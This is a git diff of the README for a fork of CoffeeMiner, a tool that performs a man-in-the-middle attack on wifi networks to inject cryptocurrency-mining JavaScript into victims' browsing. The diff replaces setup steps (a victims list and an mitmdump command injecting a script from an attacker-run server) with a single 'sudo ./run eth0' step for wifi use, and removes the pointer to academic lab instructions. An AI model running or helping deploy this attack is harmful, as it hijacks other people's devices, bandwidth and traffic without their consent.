@@ -1,4 +1,6 @@
 # CoffeeMiner
+# Original repo https://github.com/arnaucode/coffeeMiner
+# Edited by : Abhi Bhalgami
 
 Collaborative (mitm) cryptocurrency mining pool in wifi networks
 
@@ -20,20 +22,14 @@ A blog post about this project can be read here: http://arnaucode.com/blog/coffe
 ```
 bash install.sh
 ```
-- edit victims.txt with one IP per line
-- edit coffeeMiner.py, line 28, with the coffeeMiner httpserver IP:
-```py
-os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
+
+- execute run
 ```
-- execute coffeeMiner.py
+sudo ./run eth0
 ```
-python3 coffeeMiner.py ipgateway
-```
+- here replace ```eth0``` with ```wlan0``` if you want to perform in wifi
 
 ![network](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-network-attack.png "network")
-
-
-A complete instructions for academic scenario can be found in https://github.com/arnaucode/coffeeMiner/blob/master/virtualbox_scenario_instructions.md
 
 
 
